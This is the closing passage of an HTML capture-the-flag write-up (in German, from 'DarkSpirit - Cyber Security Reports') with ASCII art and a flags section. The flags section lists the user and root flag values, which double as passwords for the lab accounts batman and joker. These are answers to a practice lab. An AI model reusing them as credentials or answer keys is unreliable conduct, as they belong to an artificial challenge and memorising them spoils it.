+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⣴⣏⣁⠀⢻⠀⠀⢀⡴⣺⠝⠀⠀⠀⢀⣀⢶⠛⠁⠸⡄⠀⣿⠀⠹⠄⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⢙⠲⢄⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⢸⡇⠈⠻⣷⣾⠀⠀⣨⠟⣁⣀⣤⣴⠶⠋⠁⢸⠀⠀⠀⣷⠀⣿⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⢀⡟⠀⢸⠀⠀⠉⠒⠄
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡳⠀⠀⠙⢿⣀⡶⠉⣿⠉⠉⠉⣧⠀⠀⠀⢸⠀⠀⠀⣿⣠⣿⠀⠀⠀⠀⢀⣾⠇⠀⠀⠀⡼⠁⠀⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠸⠿⣷⡀⠸⡀⠀⠀⠹⡄⠀⠀⠸⢀⣀⡴⠟⣿⠇⠀⠀⠀⠀⣾⡏⠀⠀⠀⣸⠃⠀⢰⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠻⣧⣠⢧⡤⠤⠤⠿⣆⠀⠚⠉⣧⠀⢰⡿⠀⠀⠀⢀⣾⡟⠀⠀⠀⢠⠇⠀⠀⣸⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣀⣀⢀⣤⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣾⠉⠀⠀⣷⠀⠀⠀⢻⡀⠀⠀⢻⠀⣿⠁⠀⠀⢠⣾⡿⠀⠀⠀⢠⡞⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀
+⠀⢰⣾⣿⠷⣿⣿⠵⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠘⣆⠀⠀⣿⠀⠀⠀⠀⣧⠀⠀⣸⣾⠃⠀⠀⣠⣿⠟⠀⠀⠀⢀⡞⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀
+⠀⠈⡻⠉⠋⠉⢁⣤⣼⡏⢠⣆⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⣿⣶⣤⣼⣤⣀⣀⣀⡽⠶⣚⡿⠁⠀⢀⣾⣿⠋⠀⠀⠀⠀⡼⠁⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀
+⢰⣶⢟⡴⢾⢇⣏⣤⡿⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣦⠉⠉⠉⠉⠙⠛⠛⠋⠉⠉⠀⠀⣠⣿⣟⠁⠐⠒⠒⠶⡾⠁⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀
+⣸⣃⣽⣣⠜⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠈⠳⡄⠀⠀⡼⠁⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠿⠉⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⡀⠀⠀⠀⠀⠀⢀⣴⠟⠧⣄⠀⠀⠀⠙⣦⡞⠁⠀⠀⠀⣀⣺⠴⠶⢲⡆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣸⡏⠀⠀⠀⠀⣀⣴⡏⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⠉⠹⣄⠀⠀⠀⣠⠟⠁⠀⠀⠈⠓⣦⣀⣠⢟⠀⣠⠴⠞⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣶⠏⢻⣶⡶⣾⣿⣟⡯⠞⠃⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠹⣄⣠⣞⠉⠉⠉⠉⠉⠓⠲⢶⠾⠶⢿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀
+⠀⠀⠈⠀⠉⠉⣉⣻⠉⠉⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠉⠹⣆⠀⠀⠀⠀⠀⠀⠘⣦⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
+⠀⠀⢀⣠⣶⠋⡽⠃⠀⢀⣀⡴⠞⠀⠀⠀⠀⠀⣀⣠⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠈⣳⢶⣿⣀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀
+⠀⠀⠎⠀⣼⠋⠀⠰⢊⣯⡟⠀⢀⣀⡤⠶⠒⠉⠉⠁⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡄⠀⠀⠀⠀⢀⣾⠁⣸⠇⢹⠳⣄⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣯⢉⡶⡆⣸⡉⠓⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠹⡀⠀⠀⣰⠏⡾⠀⣿⠀⢸⠀⠈⣿⢦⡀⠀⢰⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⡿⠋⠁⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⣀⡜⠁⢠⠇⠀⣧⠀⢸⠀⠀⡇⠀⠙⠲⡽⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠉⠀⠀⣿⠀⠀⣿⠀⢸⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠉⠉⠛⢿⡆⢸⡇⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠘⣧⡾⠃⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀
+
+           Good job!! You just discovered the criminal!
+</pre>
+                 </div>
+            </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User- und Root-Flags werden gemäß den im Test gefundenen Passwörtern angegeben, wie im Originaltext am Ende zusammengefasst.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Die Flags entsprechen den Passwörtern, die für den Zugriff auf `batman` (User) und `joker` (Root-Flag-Zugriff) verwendet wurden.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat user.txt (Password for batman)</div>
+                     <div class="flag-value"><span class="password">ThisIsTheRealPassw0rd!</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat flag.txt (Password for joker)</div>
+                     <div class="flag-value"><span class="password">ThatMadeMeL4ugh!</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-06-19</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
